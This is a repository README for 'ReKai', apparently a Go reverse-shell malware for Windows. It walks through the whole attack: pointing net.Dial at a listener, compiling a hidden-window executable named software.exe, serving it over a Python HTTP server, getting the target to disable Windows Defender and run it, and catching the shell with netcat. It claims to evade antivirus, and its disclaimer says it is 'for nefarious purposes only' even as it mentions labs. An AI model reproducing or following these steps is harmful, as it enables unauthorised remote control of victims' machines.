# 📎 **Rekai (Reverse kai)**

**ReKai** is a small malware made in Go with the purpose of gaining access to a Windows machine remotely through reverse shell.
This payload allows pentesters to experiment over TCP connections and can be useful for those who are learning about reverse engineering and malware analysis.

The payload does NOT include any obfuscation attemp or any other syscall than TCP conection. It is a ethical purpose working. However, this payload
can be used to gain access into machines you don't have permissions. Please, allways use it in Virtual Machines or controlled LABs.

--------------------------------------------------------------------------------------------------------------------------------------------------------------

## ✨ Features

```bash
                    
  ✅ Hides CMD         The Payload hides cmd.exe 

  ✅ Free navigation   The target is not noticed by the malware unless for Win defender

  ⚠️ Aativirus bypass  It can bypass WinDefender automated scans if the payload is alredy loaded.

  ❌ EDR bypass        The payload does not have any obfuscation. It is an ethical work


```

--------------------------------------------------------------------------------------------------------------------------------------------------------------

## 🪰 How to use it?

 Since you've cloned the repo. Just navigate into it and execute the command:

```bash

nano payload.go

```
  

 then change te part:
   
 
```go

net.Dial("tcp", "LAN_IPV4:4444")

```

 to:  

```go

net.Dial("tcp," "192.168.1.101:4444") - or your listener ip

```  
  
 Next that, compile with:

```bash

GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui -s -w" -o software.exe payload.go

``` 
--------------------------------------------------------------------------------------------------------------------------------------------------------------

## 👾 How to infect the target ?

 Firts, make sure you have installed python3.
 
```bash

python3 -version

```
  expected output : 

```bash

Python 3.13.5

```
  
  Then, Make a temporal server.
  
  ```bash

python3 -m http.server 8000

```
  
  expected output :
  

                    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

 The target machine must open web browser and type:
  
```bash

http://attacker_machine_ip:8000

```  

 just disable win defender and download the previous compiled *software.exe*

----------------------------------------------------------------------------------------------------------------------------------------------------------------

## 😈 Final attack
 

 Start to listen with nc in the port 4444

```bash

sudo nc -lvnp 4444

```

  expected output : 

```bash

Listening on 0.0.0.0 4444

```


 Just double click on software.exe in target machine and...


## ✅ Conection stablished

📹 see demo in **demo.mp4** 

## ⚠️  Disclaimer

```bash

This is for nefarious purposes only. The payload can partially bypass some scans automated by Windows Defender and,
as it is a simple malware with no known signatures,
the victim may not be warned by the corresponding response process.
Please do not use this malware to attack systems that you do not have access to.

Tested on Windows 10 / 11

```

## 💞 Sponsor

join our cybersecurity discord community : https://discord.gg/PKwfaETBD

```bash

if the dc link is expired, contact me on Gmail : kaijul3le@gmail.com

```
